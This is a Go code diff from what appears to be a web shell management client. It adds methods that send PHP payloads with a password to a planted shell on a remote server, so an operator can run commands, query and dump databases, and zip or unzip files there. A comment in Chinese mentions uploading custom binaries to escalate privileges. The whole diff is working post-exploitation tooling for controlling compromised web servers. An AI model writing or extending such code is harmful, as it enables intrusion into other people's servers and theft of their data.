@@ -61,6 +61,7 @@ func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error)
 // ExecCommand executes a command on the PHP shell and returns the output
 func (s *PHPShell) ExecCommand(id int, command string, url string, password string) (string, error) {
 	// Todo 需要支持自己上传cmd。有时候可以提权
+
 	// 1. first need to get the system type
 	code, err := os.ReadFile("./pkg/api/php/OS.php")
 	if err != nil {
@@ -114,6 +115,56 @@ function encrypt($data, $key) {
 	return base64_encode($data);
 }`, code)
 	res, err := util.HookPost(url, password, shellcode, PhpSessions[id])
+	if err != nil {
+		return "HookPost error", err
+	}
+	return res, nil
+}
+
+func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
+	code, err := os.ReadFile("./pkg/api/php/Database.php")
+	if err != nil {
+		return "", err
+	}
+
+	// step 1, database is "", get all dbname
+	if database == "" {
+		code = fmt.Appendf(code,
+			"\nlistDatabases(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\");", driver, host, port, user, pass, encoding)
+	} else {
+		// step 2 , user choses dbname
+		code = fmt.Appendf(code,
+			"\nmain(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", %s, \"%s\",);", driver, host, port, user, pass, database, sql, option, encoding)
+	}
+
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
+	if err != nil {
+		return "HookPost error", err
+	}
+	return res, nil
+
+}
+
+func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
+	code, err := os.ReadFile("./pkg/api/php/FileZip.php")
+	if err != nil {
+		return "", err
+	}
+	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
+	if err != nil {
+		return "HookPost error", err
+	}
+	return res, nil
+}
+
+func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
+	code, err := os.ReadFile("./pkg/api/php/FileUnZip.php")
+	if err != nil {
+		return "", err
+	}
+	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
+	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
 		return "HookPost error", err
 	}
